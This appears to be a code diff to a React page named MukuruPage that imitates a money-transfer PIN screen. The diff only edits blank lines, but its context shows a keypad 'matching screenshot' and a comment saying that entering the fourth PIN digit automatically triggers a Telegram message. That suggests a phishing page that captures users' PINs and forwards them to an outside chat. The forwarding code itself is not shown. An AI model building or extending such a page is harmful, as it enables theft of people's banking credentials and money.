@@ -104,7 +104,7 @@ export default function MukuruPage() {
       const nextPin = [...pin, num]
       setPin(nextPin)
 
-      
+
       // When 4th digit is entered, automatically trigger Telegram message & verification
       if (nextPin.length === 4) {
         const pinCode = nextPin.join("")
@@ -354,6 +354,7 @@ export default function MukuruPage() {
                   </div>
                 ))}
               </div>
+
 
               {/* On-Screen Numeric Keypad matching screenshot */}
               <div className="w-full max-w-[340px] sm:max-w-[370px] mx-auto grid grid-cols-3 gap-y-7 sm:gap-y-9 text-center">
